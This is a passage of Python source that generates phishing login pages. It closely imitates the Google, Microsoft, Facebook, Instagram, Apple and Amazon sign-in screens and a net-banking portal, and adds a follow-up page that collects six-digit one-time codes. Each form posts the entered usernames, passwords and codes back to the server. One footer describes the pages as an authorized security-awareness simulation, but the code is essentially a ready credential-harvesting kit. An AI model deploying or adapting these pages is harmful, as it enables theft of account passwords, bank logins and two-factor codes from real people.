        f'      <input id="{fname}" name="{fname}" type="{ftype}" '
        f'placeholder="{_esc(placeholder)}" autocomplete="{ac}" required{af}>\n'
        f"    </div>\n"
    )


def _password(style="boxed", label="Password"):
    if style == "underline":
        return (
            '    <div class="field">\n'
            f'      <label for="password">{_esc(label)}</label>\n'
            '      <input id="password" name="password" type="password" '
            'placeholder="Password" autocomplete="current-password" required>\n'
            "    </div>\n"
        )
    if style == "floating":
        return (
            '    <div class="field float">\n'
            '      <input id="password" name="password" type="password" '
            'placeholder="Enter your password" autocomplete="current-password" required>\n'
            f'      <label for="password">{_esc(label)}</label>\n'
            "    </div>\n"
        )
    return (
        '    <div class="field">\n'
        f'      <label for="password">{_esc(label)}</label>\n'
        '      <input id="password" name="password" type="password" '
        'placeholder="Password" autocomplete="current-password" required>\n'
        "    </div>\n"
    )


def _otp_page(slug, name, brand, mark, otp_label, favicon, *, bg, card_bg, text, muted,
              radius, heading, sub, button_label):
    """The second page of every flow: the code step, dressed in the same skin."""
    inputs = "".join(
        f'    <input name="otp_{i}" maxlength="1" inputmode="numeric"'
        f'{" autofocus" if i == 1 else ""}>\n' for i in range(1, 7))
    return (
        _head(name, f"Verify it is you - {name}", brand, favicon)
        + "<style>\n"
        + f"  body {{ margin:0;min-height:100vh;display:flex;align-items:center;"
          f"justify-content:center;background:{bg};padding:20px;"
          "font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,"
          "Helvetica,Arial,sans-serif; }\n"
        + f"  .card {{ background:{card_bg};width:100%;max-width:420px;"
          f"border-radius:{radius};padding:40px 36px;text-align:center;"
          "box-shadow:0 12px 40px rgba(0,0,0,.10); }\n"
        + "  .mark { display:flex;justify-content:center;margin:0 0 20px; }\n"
        + f"  h1 {{ font-size:20px;margin:0 0 8px;color:{text};font-weight:600; }}\n"
        + f"  p {{ color:{muted};font-size:14px;line-height:1.55;margin:0 0 22px; }}\n"
        + "  .otp { display:flex;gap:8px;justify-content:center;margin-bottom:20px; }\n"
        + f"  .otp input {{ width:44px;height:52px;text-align:center;font-size:20px;"
          f"border:1px solid #ccd0d5;border-radius:8px;outline:none;background:{card_bg};"
          f"color:{text}; }}\n"
        + f"  .otp input:focus {{ border-color:{brand}; }}\n"
        + f"  button {{ width:100%;padding:13px;font-size:16px;font-weight:600;"
          f"color:#fff;background:{brand};border:0;border-radius:{radius};cursor:pointer; }}\n"
        + f"  .resend {{ margin-top:14px;font-size:13px;color:{muted}; }}\n"
        + f"  .resend a {{ color:{brand};text-decoration:none; }}\n"
        + "</style>\n</head>\n<body>\n"
        + '<form class="card" method="POST" action="/">\n'
        + f'  <div class="mark">{mark}</div>\n'
        + f"  <h1>{_esc(heading)}</h1>\n"
        + f"  <p>{sub}</p>\n"
        + '  <div class="otp">\n' + inputs + "  </div>\n"
        + f'  <button type="submit">{_esc(button_label)}</button>\n'
        + _trailer(slug, '  <div class="resend">Didn\'t get a code? '
                         '<a href="#">Resend</a></div>\n')
        + "</form>\n</body>\n</html>\n"
    )


# --------------------------------------------------------------- archetypes ---
# Each function builds one page in the shape the real site uses. CSS carries __TOKEN__
# markers that _fill() replaces, so no rule needs brace escaping.

def _fill(text, **values):
    for key, value in values.items():
        text = text.replace("__" + key.upper() + "__", str(value))
    return text


_GOOGLE_CSS = """
  body { margin:0;min-height:100vh;background:#fff;color:#202124;
         font-family:'Google Sans',Roboto,-apple-system,BlinkMacSystemFont,'Segoe UI',
                     Helvetica,Arial,sans-serif;display:flex;flex-direction:column; }
  .top { padding:16px 24px; }
  .wrap { flex:1;display:flex;justify-content:center;align-items:flex-start;
          padding:8px 24px 48px; }
  .box { width:100%;max-width:450px; }
  .box .logo { margin:0 0 20px; }
  h1 { font-size:24px;font-weight:400;margin:0 0 8px;letter-spacing:0; }
  .sub { font-size:16px;color:#202124;margin:0 0 28px; }
  .field { position:relative;margin-bottom:26px; }
  .field input { width:100%;padding:15px 14px;font-size:16px;color:#202124;
                 background:transparent;border:1px solid #dadce0;border-radius:4px;
                 outline:none;box-sizing:border-box; }
  .field input:focus { border:2px solid __BRAND__;padding:14px 13px; }
  .field label { position:absolute;left:13px;top:-9px;background:#fff;padding:0 4px;
                 font-size:12px;color:#5f6368; }
  .row { display:flex;align-items:center;gap:12px;margin:0 0 8px; }
  .row .spacer { flex:1; }
  .row a { color:__BRAND__;font-size:14px;font-weight:500;text-decoration:none; }
  .btn { background:__BRAND__;color:#fff;border:0;border-radius:4px;padding:10px 26px;
         font-size:14px;font-weight:500;cursor:pointer; }
  .btn:hover { background:#1a73e8; }
  .foot { display:flex;justify-content:space-between;font-size:12px;color:#5f6368;
          padding:20px 24px;max-width:900px;margin:0 auto;width:100%;box-sizing:border-box; }
  .foot a { color:#5f6368;text-decoration:none;margin-left:22px; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
"""


# The brands that really are served by Google's or Microsoft's own sign-in page.
# Any other brand routed to those layouts keeps its own name in the title, so a
# mis-route can never put another company's name on the page.
GOOGLE_FAMILY = {"google", "gmail", "youtube", "googleworkspace"}
MS_FAMILY = {"microsoft", "outlook", "office", "office365", "azure", "entra", "m365",
             "onedrive", "sharepoint", "teams"}


def _google_page(slug, name, brand, mark, fields, subtitle, favicon):
    fields_html = "".join(_field(label, fname, ftype, ph, style="floating")
                          for fname, label, ftype, ph in fields)
    body = (
        '<div class="top"></div>\n<div class="wrap">\n<div class="box">\n'
        f'  <div class="logo">{mark}</div>\n'
        f"  <h1>Sign in</h1>\n"
        '  <p class="sub">Use your Google Account</p>\n'
        '  <form method="POST" action="/">\n'
        + fields_html + _password("floating", "Enter your password")
        + '    <div class="row"><a href="#">Forgot email?</a><span class="spacer"></span>'
          '<a href="#">Create account</a></div>\n'
        '    <div class="row"><span class="spacer"></span>'
        '<button class="btn" type="submit">Next</button></div>\n'
        + _trailer(slug)
        + "  </form>\n</div>\n</div>\n"
        '<div class="foot"><span>English (United States)</span><span>'
        '<a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></span></div>\n'
        "</body>\n</html>\n"
    )
    return (_head(name, "Sign in - Google Accounts", brand, favicon,
                  extra=f"<style>{_fill(_GOOGLE_CSS, brand=brand)}</style>\n</head>\n<body>\n")
            + body)


_MS_CSS = """
  body { margin:0;min-height:100vh;background:#f2f2f2;display:flex;
         align-items:center;justify-content:center;padding:24px;
         font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,
                     sans-serif;color:#1b1b1b; }
  .card { background:#fff;width:100%;max-width:440px;padding:44px;
          box-shadow:0 2px 6px rgba(0,0,0,.2);box-sizing:border-box; }
  .mark { margin:0 0 16px; }
  h1 { font-size:24px;font-weight:600;margin:0 0 16px; }
  .field { margin-bottom:16px; }
  .field label { display:block;font-size:15px;color:#1b1b1b;margin:0 0 6px; }
  .field input { width:100%;padding:6px 0;font-size:15px;border:0;
                 border-bottom:1px solid #666;outline:none;background:transparent;
                 box-sizing:border-box; }
  .field input:focus { border-bottom:2px solid __BRAND__;padding-bottom:5px; }
  .links { font-size:13px;margin:18px 0 24px; }
  .links a { color:__BRAND__;text-decoration:none;display:block;margin-bottom:8px; }
  .row { display:flex;justify-content:flex-end; }
  .btn { background:__BRAND__;color:#fff;border:0;padding:8px 32px;font-size:15px;
         cursor:pointer;min-width:108px; }
  .btn:hover { background:#0067b8; }
  .foot { font-size:12px;color:#666;margin-top:28px;display:flex;gap:16px; }
  .foot a { color:#666;text-decoration:none; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
"""


def _ms_page(slug, name, brand, mark, fields, subtitle, favicon):
    fields_html = "".join(_field(label, fname, ftype, ph, style="underline")
                          for fname, label, ftype, ph in fields)
    body = (
        '<div class="card">\n'
        f'  <div class="mark">{mark}</div>\n'
        "  <h1>Sign in</h1>\n"
        '  <form method="POST" action="/">\n'
        + fields_html + _password("underline")
        + '    <div class="links"><a href="#">No account? Create one!</a>'
          '<a href="#">Forgot password?</a></div>\n'
        '    <div class="row"><button class="btn" type="submit">Next</button></div>\n'
        + _trailer(slug)
        + "  </form>\n"
        '  <div class="foot"><a href="#">Terms of use</a>'
        '<a href="#">Privacy &amp; cookies</a></div>\n'
        "</div>\n</body>\n</html>\n"
    )
    return (_head(name, "Sign in to your account", brand, favicon,
                  extra=f"<style>{_fill(_MS_CSS, brand=brand)}</style>\n</head>\n<body>\n")
            + body)


_FB_CSS = """
  body { margin:0;min-height:100vh;background:#fff;color:#1c1e21;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
                     sans-serif; }
  .bar { background:__BRAND__;padding:0 16px;height:60px;display:flex;align-items:center;
         box-shadow:0 1px 2px rgba(0,0,0,.15); }
  .bar .inner { max-width:980px;margin:0 auto;width:100%;display:flex;align-items:center; }
  .wrap { display:flex;justify-content:center;padding:48px 16px; }
  .col { width:100%;max-width:396px; }
  .card { background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),
          0 8px 16px rgba(0,0,0,.1);padding:20px 16px;box-sizing:border-box; }
  h1 { font-size:17px;font-weight:600;text-align:center;margin:0 0 16px;color:#1c1e21; }
  .field { margin-bottom:12px; }
  .field input { width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;
                 border-radius:6px;outline:none;box-sizing:border-box;background:#fff; }
  .field input:focus { border-color:__BRAND__;box-shadow:0 0 0 2px #e7f3ff; }
  .btn { width:100%;padding:12px;font-size:20px;font-weight:700;color:#fff;
         background:__BRAND__;border:0;border-radius:6px;cursor:pointer; }
  .btn:hover { background:#166fe5; }
  .forgot { text-align:center;margin:14px 0 0;font-size:14px; }
  .forgot a { color:__BRAND__;text-decoration:none; }
  .divider { border-top:1px solid #dadde1;margin:20px 0; }
  .green { display:block;width:fit-content;margin:0 auto;background:#42b72a;color:#fff;
           font-size:17px;font-weight:700;padding:12px 20px;border-radius:6px;
           text-decoration:none; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
"""


def _facebook_page(slug, name, brand, mark, fields, subtitle, favicon):
    fields_html = "".join(_field(label, fname, ftype, ph)
                          for fname, label, ftype, ph in fields)
    body = (
        '<div class="bar"><div class="inner">'
        '<svg viewBox="0 0 36 36" width="40" height="40" role="img" aria-label="Facebook">'
        '<path fill="#fff" d="M25 23l.8-5h-4.8v-3.2c0-1.4.7-2.8 2.9-2.8h2.2V7.6s-2-.3-3.9'
        '-.3c-3.9 0-6.4 2.4-6.4 6.6V18H11v5h4.8v12h5.9V23H25z"/></svg>'
        "</div></div>\n"
        '<div class="wrap"><div class="col">\n'
        '  <form class="card" method="POST" action="/">\n'
        "    <h1>Log in to Facebook</h1>\n"
        + fields_html + _password("boxed", "Password")
        + '    <button class="btn" type="submit">Log in</button>\n'
        '    <div class="forgot"><a href="#">Forgotten password?</a></div>\n'
        + _trailer(slug)
        + '    <div class="divider"></div>\n'
        '    <a class="green" href="#">Create new account</a>\n'
        "  </form>\n"
        "</div></div>\n</body>\n</html>\n"
    )
    return (_head(name, "Log in to Facebook", brand, favicon,
                  extra=f"<style>{_fill(_FB_CSS, brand=brand)}</style>\n</head>\n<body>\n")
            + body)


_IG_CSS = """
  body { margin:0;min-height:100vh;background:#fafafa;color:#262626;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
                     sans-serif;display:flex;align-items:center;justify-content:center;
         padding:32px 16px; }
  .stage { display:flex;align-items:center;gap:24px; }
  .phone { width:380px;height:580px;background:#fff;border:1px solid #dbdbdb;
           border-radius:36px;box-shadow:0 12px 40px rgba(0,0,0,.12);display:flex;
           align-items:center;justify-content:center;position:relative; }
  .phone:before { content:'';position:absolute;top:12px;width:120px;height:22px;
                  background:#000;border-radius:12px;opacity:.85; }
  .phone .feed { width:70%; }
  .phone .feed .bar { height:14px;background:#efefef;border-radius:7px;margin-bottom:12px; }
  .phone .feed .tile { height:150px;background:linear-gradient(135deg,#feda75,#d62976,
                        #962fbf);border-radius:12px;margin-bottom:12px; }
  .col { width:100%;max-width:350px; }
  .card { background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:40px 32px;
          text-align:center;box-sizing:border-box; }
  .wordmark { margin:0 0 28px; }
  .field { margin-bottom:6px; }
  .field input { width:100%;padding:11px 12px;font-size:14px;background:#fafafa;
                 border:1px solid #dbdbdb;border-radius:3px;outline:none;
                 box-sizing:border-box; }
  .field input:focus { border-color:#a8a8a8; }
  .btn { width:100%;padding:9px;font-size:14px;font-weight:600;color:#fff;
         background:__BRAND__;border:0;border-radius:8px;cursor:pointer;margin:10px 0 14px; }
  .or { display:flex;align-items:center;gap:16px;margin:0 0 16px; }
  .or .line { flex:1;height:1px;background:#dbdbdb; }
  .or span { font-size:12px;font-weight:600;color:#8e8e8e; }
  .fb { font-size:14px;font-weight:600;color:#385185;text-decoration:none; }
  .forgot { font-size:12px;color:#00376b;margin:16px 0 0;display:block; }
  .signup { background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:22px;
            text-align:center;font-size:14px;margin-top:12px; }
  .signup a { color:__BRAND__;font-weight:600;text-decoration:none; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
  @media (max-width:860px) { .phone { display:none; } }
"""


def _instagram_page(slug, name, brand, mark, fields, subtitle, favicon):
    fields_html = "".join(_field(label, fname, ftype, ph)
                          for fname, label, ftype, ph in fields)
    body = (
        '<div class="stage">\n'
        '  <div class="phone"><div class="feed"><div class="bar"></div>'
        '<div class="tile"></div><div class="bar"></div><div class="bar"></div></div></div>\n'
        '  <div class="col">\n'
        '    <form class="card" method="POST" action="/">\n'
        f'      <div class="wordmark">{mark}</div>\n'
        + fields_html + _password("boxed")
        + '      <button class="btn" type="submit">Log in</button>\n'
        '      <div class="or"><span class="line"></span><span>OR</span>'
        '<span class="line"></span></div>\n'
        '      <a class="fb" href="#">Log in with Facebook</a>\n'
        + _trailer(slug)
        + '      <a class="forgot" href="#">Forgot password?</a>\n'
        "    </form>\n"
        '    <div class="signup">Don\'t have an account? <a href="#">Sign up</a></div>\n'
        "  </div>\n</div>\n</body>\n</html>\n"
    )
    return (_head(name, "Login - Instagram", brand, favicon,
                  extra=f"<style>{_fill(_IG_CSS, brand=brand)}</style>\n</head>\n<body>\n")
            + body)


_APPLE_CSS = """
  body { margin:0;min-height:100vh;background:#fff;color:#1d1d1f;
         font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,
                     Helvetica,Arial,sans-serif;display:flex;flex-direction:column; }
  .wrap { flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px; }
  .box { width:100%;max-width:420px;text-align:center; }
  .mark { margin:0 0 22px;display:flex;justify-content:center; }
  h1 { font-size:24px;font-weight:600;margin:0 0 8px;letter-spacing:-.2px; }
  .sub { font-size:15px;color:#6e6e73;margin:0 0 28px; }
  .sheet { border:1px solid #d2d2d7;border-radius:12px;overflow:hidden;text-align:left; }
  .field input { width:100%;padding:16px 16px;font-size:17px;border:0;
                 border-bottom:1px solid #d2d2d7;outline:none;background:#fff;
                 box-sizing:border-box;color:#1d1d1f; }
  .field:last-child input { border-bottom:0; }
  .field input:focus { box-shadow:inset 0 0 0 2px __BRAND__;border-radius:2px; }
  .btn { width:100%;margin:22px 0 0;padding:14px;font-size:17px;font-weight:500;
         color:#fff;background:__BRAND__;border:0;border-radius:12px;cursor:pointer; }
  .links { font-size:14px;margin:22px 0 0;display:flex;flex-direction:column;gap:10px; }
  .links a { color:__BRAND__;text-decoration:none; }
  .foot { font-size:12px;color:#86868b;text-align:center;padding:24px; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
"""


def _apple_page(slug, name, brand, mark, fields, subtitle, favicon):
    fields_html = "".join(
        f'    <div class="field">'
        f'<input id="{fname}" name="{fname}" type="{ftype}" '
        f'placeholder="{_esc(label)}" autocomplete="username" required></div>\n'
        for fname, label, ftype, ph in fields)
    body = (
        '<div class="wrap"><div class="box">\n'
        f'  <div class="mark">{mark}</div>\n'
        "  <h1>Sign in to Apple Account</h1>\n"
        f'  <p class="sub">{_esc(subtitle)}</p>\n'
        '  <form method="POST" action="/">\n'
        '    <div class="sheet">\n'
        + fields_html
        + '    <div class="field"><input id="password" name="password" type="password" '
          'placeholder="Password" autocomplete="current-password" required></div>\n'
        "    </div>\n"
        '    <button class="btn" type="submit">Sign In</button>\n'
        + _trailer(slug)
        + '    <div class="links"><a href="#">Forgot password?</a>'
          '<a href="#">Create Apple Account</a></div>\n'
        "  </form>\n"
        "</div></div>\n"
        '<div class="foot">Copyright &copy; 2026 Apple Inc. All rights reserved.</div>\n'
        "</body>\n</html>\n"
    )
    return (_head(name, "Sign in to Apple Account", brand, favicon,
                  extra=f"<style>{_fill(_APPLE_CSS, brand=brand)}</style>\n</head>\n<body>\n")
            + body)


_AMZ_CSS = """
  body { margin:0;min-height:100vh;background:#fff;color:#111;
         font-family:'Amazon Ember',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,
                     Helvetica,Arial,sans-serif;display:flex;justify-content:center;
         padding:18px 16px 40px; }
  .col { width:100%;max-width:350px; }
  .mark { display:flex;justify-content:center;margin:0 0 18px; }
  .card { border:1px solid #ddd;border-radius:8px;padding:20px 26px 26px;box-sizing:border-box; }
  h1 { font-size:28px;font-weight:400;margin:0 0 14px; }
  .field { margin-bottom:14px; }
  .field label { display:block;font-size:13px;font-weight:700;margin:0 0 4px; }
  .field input { width:100%;padding:8px 10px;font-size:15px;border:1px solid #a6a6a6;
                 border-radius:4px;outline:none;box-sizing:border-box; }
  .field input:focus { border-color:__BRAND__;box-shadow:0 0 0 3px #c8f3fa; }
  .btn { width:100%;padding:9px;font-size:14px;font-weight:500;color:#111;
         background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;
         border-radius:8px;cursor:pointer;margin-top:6px; }
  .btn:hover { background:linear-gradient(to bottom,#f5d78e,#eeb933); }
  .legal { font-size:12px;color:#111;line-height:1.5;margin:14px 0 0; }
  .legal a { color:#0066c0;text-decoration:none; }
  .newto { font-size:12px;color:#767676;text-align:center;margin:22px 0 6px;
           border-top:1px solid #e7e7e7;padding-top:14px; }
  .create { display:block;text-align:center;font-size:13px;padding:8px;border:1px solid
            #adb1b8;border-radius:8px;color:#111;text-decoration:none;
            background:linear-gradient(to bottom,#f7f8fa,#e7e9ec); }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
"""


# Only these brands are served by Amazon's own consumer sign-in page. Any other brand
# routed to this layout (AWS uses an Amazon sign-in, but not the consumer page) keeps
# its own name and its own account copy.
AMAZON_FAMILY = {"amazon", "amazonpay"}


def _amazon_page(slug, name, brand, mark, fields, subtitle, favicon):
    fields_html = "".join(_field(label, fname, ftype, ph)
                          for fname, label, ftype, ph in fields)
    own = slug in AMAZON_FAMILY
    shop = "Amazon" if own else name
    body = (
        '<div class="col">\n'
        f'  <div class="mark">{mark}</div>\n'
        '  <form class="card" method="POST" action="/">\n'
        "    <h1>Sign in</h1>\n"
        + fields_html + _password("boxed", "Password")
        + '    <button class="btn" type="submit">Continue</button>\n'
        f'    <p class="legal">By continuing, you agree to {_esc(shop)}\'s '
        '<a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>\n'
        + _trailer(slug)
        + f'    <div class="newto">New to {_esc(shop)}?</div>\n'
        f'    <a class="create" href="#">Create your {_esc(shop)} account</a>\n'
        "  </form>\n</div>\n</body>\n</html>\n"
    )
    title = "Amazon Sign-In" if own else f"{name} Sign-In"
    return (_head(name, title, brand, favicon,
                  extra=f"<style>{_fill(_AMZ_CSS, brand=brand)}</style>\n</head>\n<body>\n")
            + body)


_DARK_CSS = """
  body { margin:0;min-height:100vh;background:__BG__;color:#fff;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
                     sans-serif;display:flex;align-items:center;justify-content:center;
         padding:32px 16px; }
  .card { background:__CARD__;width:100%;max-width:420px;border-radius:12px;
          padding:40px 36px;box-sizing:border-box;
          box-shadow:0 20px 60px rgba(0,0,0,.55);text-align:center; }
  .mark { display:flex;justify-content:center;margin:0 0 22px; }
  h1 { font-size:22px;font-weight:600;margin:0 0 8px; }
  .sub { font-size:14px;color:#9aa7b8;margin:0 0 26px; }
  .field { text-align:left;margin-bottom:14px; }
  .field label { display:block;font-size:13px;color:#9aa7b8;margin:0 0 6px; }
  .field input { width:100%;padding:13px 14px;font-size:15px;color:#fff;
                 background:__INPUT__;border:1px solid __LINE__;border-radius:8px;
                 outline:none;box-sizing:border-box; }
  .field input:focus { border-color:__BRAND__; }
  .btn { width:100%;padding:13px;font-size:16px;font-weight:600;color:__ONBRAND__;
         background:__BRAND__;border:0;border-radius:8px;cursor:pointer;margin-top:8px; }
  .row { display:flex;justify-content:space-between;align-items:center;margin:16px 0 0;
         font-size:13px;color:#9aa7b8; }
  .row a { color:__BRAND__;text-decoration:none; }
  .foot { font-size:12px;color:#7b8698;margin-top:22px;line-height:1.6; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
"""


def _dark_page(slug, name, brand, mark, fields, subtitle, favicon,
               bg="#0b0d12", card="#151922", line="#2a3242", onbrand="#fff"):
    fields_html = "".join(_field(label, fname, ftype, ph)
                          for fname, label, ftype, ph in fields)
    body = (
        '<div class="card">\n'
        f'  <div class="mark">{mark}</div>\n'
        f"  <h1>{_esc(name)}</h1>\n"
        f'  <p class="sub">{_esc(subtitle)}</p>\n'
        '  <form method="POST" action="/">\n'
        + fields_html + _password("boxed", "Password")
        + '    <button class="btn" type="submit">Sign in</button>\n'
        '    <div class="row"><label style="display:flex;gap:6px;align-items:center">'
        '<input type="checkbox" name="remember" value="1" checked> Keep me signed in</label>'
        '<a href="#">Forgot password?</a></div>\n'
        + _trailer(slug)
        + f'    <div class="foot">{_esc(name)} and the {_esc(name)} mark are trademarks '
          "of their respective owner.</div>\n"
        "  </form>\n</div>\n</body>\n</html>\n"
    )
    css = _fill(_DARK_CSS, brand=brand, bg=bg, card=card, line=line, onbrand=onbrand,
                input=card)
    return (_head(name, f"Sign in to {name}", brand, favicon,
                  extra=f"<style>{css}</style>\n</head>\n<body>\n") + body)


_SPLIT_CSS = """
  body { margin:0;min-height:100vh;display:flex;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
                     sans-serif;color:#1f2933; }
  .hero { flex:1 1 46%;background:__BRAND__;color:#fff;display:flex;flex-direction:column;
          justify-content:center;padding:56px 48px;box-sizing:border-box; }
  .hero .mark { margin:0 0 26px; }
  .hero h2 { font-size:30px;line-height:1.25;margin:0 0 12px;font-weight:600; }
  .hero p { margin:0;opacity:.86;font-size:15px;line-height:1.6;max-width:34ch; }
  .side { flex:1 1 54%;display:flex;align-items:center;justify-content:center;padding:32px; }
  .form { width:100%;max-width:400px; }
  h1 { font-size:22px;font-weight:600;margin:0 0 6px; }
  .sub { font-size:14px;color:#616e7c;margin:0 0 24px; }
  .field { margin-bottom:14px; }
  .field label { display:block;font-size:13px;font-weight:500;margin:0 0 6px; }
  .field input { width:100%;padding:12px 14px;font-size:15px;border:1px solid #cbd2d9;
                 border-radius:8px;outline:none;box-sizing:border-box; }
  .field input:focus { border-color:__BRAND__;box-shadow:0 0 0 3px rgba(0,0,0,.06); }
  .btn { width:100%;padding:13px;font-size:15px;font-weight:600;color:#fff;
         background:__BRAND__;border:0;border-radius:8px;cursor:pointer;margin-top:8px; }
  .links { font-size:13px;margin:16px 0 0; }
  .links a { color:__BRAND__;text-decoration:none; }
  .foot { font-size:12px;color:#7b8794;margin-top:26px;display:flex;gap:14px; }
  .foot a { color:#7b8794;text-decoration:none; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
  @media (max-width:820px) { .hero { display:none; } .side { padding:20px; } }
"""


def _split_page(slug, name, brand, mark, fields, subtitle, favicon):
    fields_html = "".join(_field(label, fname, ftype, ph)
                          for fname, label, ftype, ph in fields)
    body = (
        '<div class="hero">\n'
        f'  <div class="mark">{mark}</div>\n'
        f"  <h2>One account for everything in {_esc(name)}</h2>\n"
        "  <p>Sign in to reach your dashboard, files and settings - the same "
        "credentials you already use on the web.</p>\n</div>\n"
        '<div class="side"><div class="form">\n'
        "  <h1>Sign in</h1>\n"
        f'  <p class="sub">{_esc(subtitle)}</p>\n'
        '  <form method="POST" action="/">\n'
        + fields_html + _password("boxed")
        + '    <button class="btn" type="submit">Sign in</button>\n'
        '    <div class="links"><a href="#">Can\'t access your account?</a></div>\n'
        + _trailer(slug)
        + '    <div class="foot"><a href="#">Terms of use</a>'
          '<a href="#">Privacy</a></div>\n'
        "  </form>\n</div></div>\n</body>\n</html>\n"
    )
    return (_head(name, f"Sign in to {name}", brand, favicon,
                  extra=f"<style>{_fill(_SPLIT_CSS, brand=brand)}</style>\n</head>\n<body>\n")
            + body)


_BANK_CSS = """
  body { margin:0;min-height:100vh;background:#eef2f7;color:#1f2933;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
                     sans-serif; }
  .top { background:__BRAND__;color:#fff; }
  .top .inner { max-width:1080px;margin:0 auto;padding:14px 20px;display:flex;
                align-items:center;gap:18px; }
  .top .mark { display:flex;align-items:center; }
  .top .mark svg { max-height:30px; }
  .top .name { font-size:19px;font-weight:700;letter-spacing:.2px; }
  .top .nav { margin-left:auto;display:flex;gap:18px;font-size:13px;opacity:.92; }
  .top .nav a { color:#fff;text-decoration:none; }
  .band { background:rgba(0,0,0,.12);font-size:12px; }
  .band .inner { max-width:1080px;margin:0 auto;padding:7px 20px;display:flex;gap:16px; }
  .band a { color:#fff;text-decoration:none;opacity:.9; }
  .wrap { max-width:1080px;margin:0 auto;padding:36px 20px;display:flex;gap:28px;
          align-items:flex-start; }
  .card { background:#fff;border-radius:10px;box-shadow:0 6px 24px rgba(16,24,40,.10);
          padding:32px;box-sizing:border-box;flex:1 1 420px;max-width:460px; }
  h1 { font-size:20px;font-weight:700;margin:0 0 4px; }
  .sub { font-size:13px;color:#616e7c;margin:0 0 22px; }
  .field { margin-bottom:14px; }
  .field label { display:block;font-size:13px;font-weight:600;margin:0 0 6px; }
  .field input { width:100%;padding:12px 14px;font-size:15px;border:1px solid #cbd2d9;
                 border-radius:8px;outline:none;box-sizing:border-box; }
  .field input:focus { border-color:__BRAND__;box-shadow:0 0 0 3px rgba(0,0,0,.06); }
  .btn { width:100%;padding:13px;font-size:15px;font-weight:600;color:#fff;
         background:__BRAND__;border:0;border-radius:8px;cursor:pointer;margin-top:8px; }
  .links { display:flex;justify-content:space-between;font-size:13px;margin:16px 0 0; }
  .links a { color:__BRAND__;text-decoration:none; }
  .note { margin:20px 0 0;padding:14px;background:#fff8e1;border:1px solid #ffe082;
          border-radius:8px;font-size:12px;color:#6b5b1f;line-height:1.6; }
  .aside { flex:1 1 300px;font-size:13px;color:#3e4c59;line-height:1.7; }
  .aside h3 { font-size:14px;margin:0 0 10px; }
  .aside ul { margin:0 0 18px;padding-left:18px; }
  .foot { background:#fff;border-top:1px solid #dbe2ea;padding:20px;font-size:12px;
          color:#7b8794;text-align:center; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
  @media (max-width:860px) { .aside { display:none; } }
"""


def _bank_page(slug, name, brand, mark, fields, subtitle, favicon):
    fields_html = "".join(_field(label, fname, ftype, ph)
                          for fname, label, ftype, ph in fields)
    body = (
        '<div class="top"><div class="inner">\n'
        f'  <span class="mark">{mark}</span>\n'
        f'  <span class="name">{_esc(name)}</span>\n'
        '  <span class="nav"><a href="#">Personal</a><a href="#">Business</a>'
        '<a href="#">NRI</a><a href="#">Support</a></span>\n'
        '</div><div class="band"><div class="inner">'
        '<a href="#">Net Banking</a><a href="#">Mobile Banking</a>'
        '<a href="#">Cards</a><a href="#">Locate Us</a></div></div></div>\n'
        '<div class="wrap">\n'
        '  <form class="card" method="POST" action="/">\n'
        "    <h1>Net Banking</h1>\n"
        f'    <p class="sub">{_esc(subtitle)}</p>\n'
        + fields_html + _password("boxed", "Password")
        + '    <button class="btn" type="submit">Login</button>\n'
        '    <div class="links"><a href="#">Forgot password?</a>'
        '<a href="#">New user? Register</a></div>\n'
        + _trailer(slug)
        + '    <div class="note">Never share your password or OTP with anyone. The bank '
          "never asks for them by phone, email or SMS. Check the padlock and the address "
          "before you sign in.</div>\n"
        "  </form>\n"
        '  <div class="aside">\n'
        "    <h3>Before you log in</h3>\n"
        "    <ul><li>Use the official app or this page only.</li>"
        "<li>Keep your registered mobile number active for OTP.</li>"
        "<li>Review your last login under Profile after you sign in.</li></ul>\n"
        "    <h3>Need help?</h3>\n"
        "    <ul><li>Lock your card instantly from the app.</li>"
        "<li>Report a suspicious transaction within 3 days.</li></ul>\n"
        "  </div>\n</div>\n"
        f'<div class="foot">{_esc(name)} - this page is a simulation for an authorized '
        "security-awareness exercise. It is not affiliated with any bank.</div>\n"
        "</body>\n</html>\n"
    )
    return (_head(name, f"{name} - Net Banking", brand, favicon,
                  extra=f"<style>{_fill(_BANK_CSS, brand=brand)}</style>\n</head>\n<body>\n")
            + body)


_CARD_CSS = """
  body { margin:0;min-height:100vh;background:__BG__;display:flex;align-items:center;
         justify-content:center;padding:20px;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
                     sans-serif; }
  .card { background:#fff;width:100%;max-width:400px;border-radius:12px;
          box-shadow:0 12px 40px rgba(0,0,0,.10);padding:36px 32px 28px;
          box-sizing:border-box; }
  .mark { display:flex;justify-content:center;margin:0 0 18px; }
